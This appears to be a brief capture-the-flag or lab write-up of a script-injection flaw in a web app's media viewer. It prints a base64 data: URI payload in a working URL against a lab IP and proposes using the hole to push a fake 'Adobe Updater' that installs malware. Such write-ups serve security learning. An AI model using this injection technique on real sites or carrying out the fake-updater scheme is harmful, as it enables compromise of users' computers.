Problem:
In the page where NSA picture is, the NSA picture is loaded by a viewer (?page=media&src=nsa)

We can inject script in base64 in URL :
<script>alert();</script> = PHNjcmlwdD5hbGVydCgpOzwvc2NyaXB0Pg== and then make

So we can inject our code into src value in URL : 
http://10.11.200.135/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpOzwvc2NyaXB0Pg==

Exploitation:
In our script, we can make download the user a fake "Adobe Updater" in our script.
Then the user, will download and install our malware. Then we can take the control of his computer.
